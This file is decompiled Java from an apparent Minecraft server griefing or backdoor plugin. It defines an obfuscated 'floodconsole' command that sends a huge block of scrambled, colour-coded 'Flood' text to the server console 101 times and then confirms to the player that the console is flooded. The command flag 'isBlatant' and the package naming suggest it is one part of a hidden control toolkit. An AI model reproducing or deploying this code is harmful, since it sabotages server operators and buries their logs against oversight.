/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class FloodconsoleCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllllIIIIIIlllIlIlIll, String llllllllllllllllIIIIIIlllIlIlIlI, String[] llllllllllllllllIIIIIIlllIlIlIIl, Player llllllllllllllllIIIIIIlllIlIlIII) {
        String llllllllllllllllIIIIIIlllIlIIlll = ChatColor.translateAlternateColorCodes((char)'&', (String)"&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood&a&kFlood&b&kFlood&1&kFlood&2&kFlood&3&kFlood&4&kFlood&5&kFlood&6&kFlood&7&kFlood&8&kFlood&9&kFlood&f&kFlood");
        for (int llllllllllllllllIIIIIIlllIlIllIl = 0; llllllllllllllllIIIIIIlllIlIllIl <= 100; ++llllllllllllllllIIIIIIlllIlIllIl) {
            Bukkit.getServer().getConsoleSender().sendMessage(llllllllllllllllIIIIIIlllIlIIlll);
        }
        llllllllllllllllIIIIIIlllIlIlIII.sendMessage(Settings.PREFIX("Console is now flooded!"));
    }

    public FloodconsoleCommand() {
        FloodconsoleCommand llllllllllllllllIIIIIIlllIllIIIl;
    }
}

